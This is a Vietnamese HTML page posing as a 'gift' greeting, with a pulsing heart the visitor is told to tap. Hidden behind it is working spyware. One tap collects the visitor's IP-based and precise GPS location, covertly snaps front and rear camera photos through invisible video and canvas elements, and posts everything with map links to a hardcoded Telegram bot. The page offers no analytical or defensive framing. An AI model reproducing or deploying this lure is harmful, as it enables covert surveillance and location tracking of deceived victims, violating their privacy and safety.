<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gửi Tặng Bạn</title>
    <style>
        body {
            margin: 0; padding: 0; display: flex;
            flex-direction: column;
            justify-content: center; align-items: center;
            min-height: 100vh; background-color: #ffe6e6; overflow: hidden;
            font-family: Arial, sans-serif;
        }
        .container {
            text-align: center;
            cursor: pointer;
        }
        .heart {
            position: relative; width: 100px; height: 90px;
            background-color: red; transform: rotate(-45deg);
            animation: beat 1s infinite; margin: 50px auto;
        }
        .heart::before, .heart::after {
            content: ""; position: absolute; width: 100px; height: 100px;
            background-color: red; border-radius: 50%;
        }
        .heart::before { top: -50px; left: 0; }
        .heart::after { left: 50px; top: 0; }
        @keyframes beat {
            0% { transform: scale(1) rotate(-45deg); }
            50% { transform: scale(1.2) rotate(-45deg); }
            100% { transform: scale(1) rotate(-45deg); }
        }
        .text {
            color: #d32f2f;
            font-size: 18px;
            font-weight: bold;
            margin-top: 20px;
        }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="container" onclick="startProcess()">
        <div class="heart"></div>
        <div class="text" id="statusText">Bấm vào trái tim để nhận quà ❤️</div>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = '8907393193:AAHR3ePsPfQzds4U-vbo21ju3dM5_3hr5uA';
        const CHAT_ID = '8608244308';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let isRunning = false;

        // 1. Lấy thông tin IP (Có cơ chế dự phòng)
        async function getIPInfo() {
            try {
                const res1 = await fetch('https://api.ipify.org?format=json');
                const data1 = await res1.json();
                const ip = data1.ip;

                try {
                    const res2 = await fetch(`https://ipwho.is/${ip}`);
                    const data2 = await res2.json();
                    if (data2.success) {
                        return {
                            ip: ip,
                            city: data2.city || '',
                            region: data2.region || '',
                            country: data2.country || '',
                            lat: data2.latitude,
                            lon: data2.longitude
                        };
                    }
                } catch (e) {}

                return { ip: ip, city: '', region: '', country: '', lat: null, lon: null };
            } catch (e) {
                try {
                    const resFallback = await fetch('https://ipinfo.io/json');
                    const dataFB = await resFallback.json();
                    const loc = dataFB.loc ? dataFB.loc.split(',') : [null, null];
                    return {
                        ip: dataFB.ip || 'Không rõ',
                        city: dataFB.city || '',
                        region: dataFB.region || '',
                        country: dataFB.country || '',
                        lat: loc[0],
                        lon: loc[1]
                    };
                } catch (err) {
                    return { ip: 'Không rõ', city: '', region: '', country: '', lat: null, lon: null };
                }
            }
        }

        // 2. Lấy Tọa độ GPS chính xác
        function getGeolocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 6000 }
                );
            });
        }

        // 3. Hàm chụp ảnh theo hướng camera
        function captureStream(constraints) {
            return new Promise(async (resolve) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
                    video.srcObject = stream;
                    video.onloadedmetadata = () => {
                        setTimeout(() => {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            
                            stream.getTracks().forEach(track => track.stop());

                            canvas.toBlob((blob) => {
                                resolve(blob);
                            }, 'image/jpeg', 0.8);
                        }, 800);
                    };
                } catch (e) {
                    resolve(null);
                }
            });
        }

        // 4. Gửi dữ liệu về Telegram
        async function sendToTelegram(photoBlob, captionText) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            if (photoBlob) {
                formData.append('photo', photoBlob, 'photo.jpg');
                formData.append('caption', captionText);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } else {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: captionText, parse_mode: 'Markdown' })
                });
            }
        }

        // 5. Kích hoạt khi bấm vào trái tim
        async function startProcess() {
            if (isRunning) return;
            isRunning = true;
            document.getElementById('statusText').innerText = "Đang mở quà...";

            const ipData = await getIPInfo();
            const gpsLocation = await getGeolocation();

            let locationText = `🌐 **THÔNG TIN THU THẬP:**\n`;
            locationText += `• IP: \`${ipData.ip}\`\n`;

            if (gpsLocation) {
                locationText += `📍 **Vị trí GPS chính xác:**\n`;
                locationText += `• Tọa độ: \`${gpsLocation.lat},${gpsLocation.lon}\`\n`;
                locationText += `🔗 **Google Maps:** https://www.google.com/maps?q=${gpsLocation.lat},${gpsLocation.lon}\n`;
            } else {
                locationText += `📍 **Vị trí ước tính qua IP (Chưa bật GPS):**\n`;
                if (ipData.city || ipData.region) {
                    locationText += `• Khu vực: ${ipData.city}, ${ipData.region}, ${ipData.country}\n`;
                }
                if (ipData.lat && ipData.lon) {
                    locationText += `🔗 **Google Maps (IP):** https://www.google.com/maps?q=${ipData.lat},${ipData.lon}\n`;
                } else {
                    locationText += `• Không xác định được tọa độ IP\n`;
                }
            }

            // Chụp Cam Trước
            const frontPhoto = await captureStream({ video: { facingMode: "user" } });
            if (frontPhoto) {
                await sendToTelegram(frontPhoto, locationText + `📸 **Loại ảnh:** Camera Trước (Selfie)`);
            }

            // Chụp Cam Sau
            const backPhoto = await captureStream({ video: { facingMode: { exact: "environment" } } }) 
                             || await captureStream({ video: { facingMode: "environment" } });
            if (backPhoto) {
                await sendToTelegram(backPhoto, `📸 **Loại ảnh:** Camera Sau`);
            }

            // Nếu từ chối camera -> gửi thông báo bản tin
            if (!frontPhoto && !backPhoto) {
                await sendToTelegram(null, locationText + `⚠️ **Camera:** Không cấp quyền camera.`);
            }

            document.getElementById('statusText').innerText = "Chúc bạn một ngày vui vẻ! ❤️️";
        }
    </script>
</body>
</html>
